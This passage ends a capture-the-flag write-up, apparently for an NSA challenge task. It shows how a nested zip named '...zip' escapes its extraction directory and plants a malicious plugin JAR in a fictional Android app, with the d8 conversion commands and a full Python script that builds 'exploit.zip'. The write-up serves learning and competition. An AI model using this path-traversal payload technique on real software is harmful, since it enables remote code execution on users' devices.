then converting the `.class` files into `.dex` files

```bash
java -cp "C:\Users\myk06\AppData\Local\Android\Sdk\build-tools\33.0.2\lib\d8.jar" com.android.tools.r8.D8 --output out_dex ZipFormat_7z.jar
```

Then packaging those `.dex` files into a JAR

```bash
cd out_dex

jar cf ../ZipFormat_7z_dex.jar classes.dex
```

We now finally have the JAR we need

Now using the below Python file, we can assemble our malicious zip file

```python
import zipfile

# Create inner zip with the malicious JAR at the right path
with zipfile.ZipFile('inner.zip', 'w') as z:
    # Path relative to /cache/zippier/
    with open("ZipFormat_7z_dex.jar", "rb") as jar_file:
        jar_bytes = jar_file.read()

    z.writestr('formats/net.axolotl.zippier.ZipFormat_7z.jar', jar_bytes)

    z.writestr('pwn.7z', b'Trigger exploit')


# Read inner zip
with open('inner.zip', 'rb') as f:
    inner_zip_data = f.read()

''' 
Create outer zip with inner named to escape to parent, and its contents are what we created above 

Extracts inner zip as just "..", so 'formats/net.axolotl.zippier.ZipFormat_7z.jar' gets extracted to
/cache/zippier/extract/../formats/net.axolotl.zippier.ZipFormat_7z.jar, which is just 
/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar
'''
with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.writestr('...zip', inner_zip_data)
```

Basically we first create the inner zip, which consists of the JAR file, which we name `formats/net.axolotl.zippier.ZipFormat_7z.jar`, and a dummy file `pwn.7z` to trigger the exploit

The outer zip, named `exploit.zip`, then consists of another zip named `...zip`, which contains the above contents

Uploading this `exploit.zip`, we see that our exploit worked!

![image9](./images/task7img9.png)
![image11](./images/task7img11.png)
![image10](./images/task7img10.png)

Submitting this zip file solves this task! 

It was a really fun journey, and we learned a lot. The challenge coin has finally been acquired

**Response:**
> With full access to the device we now have full visibility into this threat actor's entire infrastructure and capabilities. The US Military has everything they need to take decisive action against this threat. The security configurations of DoD networks worldwide are updated to guard against the exploited vulnerabilities, the adversary's infrastructure is destroyed, and the entire team of threat actors are identified. DIRNSA briefed the president on your work and how you enabled the mitigation of this threat. Great job!

> Through dedication, skill, and teamwork; NSA guaranteed the protection of the US Militaries advantage in the cyber domian.